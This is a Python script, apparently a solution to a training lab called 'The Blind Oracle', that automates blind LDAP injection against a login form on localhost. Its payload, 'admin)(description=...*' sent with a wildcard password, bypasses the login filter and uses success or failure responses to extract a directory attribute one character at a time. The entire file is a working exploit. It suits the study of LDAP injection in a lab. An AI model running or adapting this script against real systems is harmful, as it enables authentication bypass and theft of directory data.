```python
"""
LAB: Lab 2 - The Blind Oracle
TYPE: LDAP Injection (Blind / Boolean Inference)
AUTHOR: [Sithum Ranasinghe]
DESCRIPTION: 
    1. Automates the exfiltration of sensitive LDAP attributes from a blind injection point.
    2. Uses boolean inference (analyzing SUCCESS vs FAILURE responses) to reconstruct 
       data character-by-character when the application suppresses direct output.
"""

import requests
import sys
import string

# --- Configuration ---
# Target: Blind LDAP Oracle
# Goal: Extract the 'description' attribute via boolean inference.
TARGET_URL = "http://localhost:5000/"

def run_blind_exploit(url):
    """
    Automates character-by-character exfiltration of LDAP attributes.
    """
    # Define search space: letters, numbers, and common symbols/spaces
    charset = string.ascii_letters + string.digits + " @._-"
    extracted_data = ""
    
    print(f"[*] Target URL: {url}")
    print("[*] Initiating Blind Extraction on attribute: 'description'")
    print("-" * 50)

    # Outer loop for string length
    for position in range(1, 101): # Assume max 100 characters
        found_char = False
        
        for char in charset:
            # Construct Injection Payload
            # Logic: admin)(description=KNOWN_DATA + GUESS + *
            payload = {
                "username": f"admin)(description={extracted_data}{char}*",
                "password": "*"
            }
            
            try:
                response = requests.post(url, data=payload)
                
                # Visual Feedback
                sys.stdout.write(f"\r[+] Current Progress: {extracted_data}{char}")
                sys.stdout.flush()

                # Check the Oracle's response
                if "SUCCESS" in response.text:
                    extracted_data += char
                    found_char = True
                    break
            except requests.exceptions.RequestException as e:
                print(f"\n[!] Connection Error: {e}")
                return

        # If no character in the charset worked, we've hit the end of the string
        if not found_char:
            print("\n" + "-" * 50)
            print(f"[!] Extraction Complete.")
            print(f"[!] Final Extracted Value: {extracted_data}")
            break

if __name__ == "__main__":
    run_blind_exploit(TARGET_URL)
```
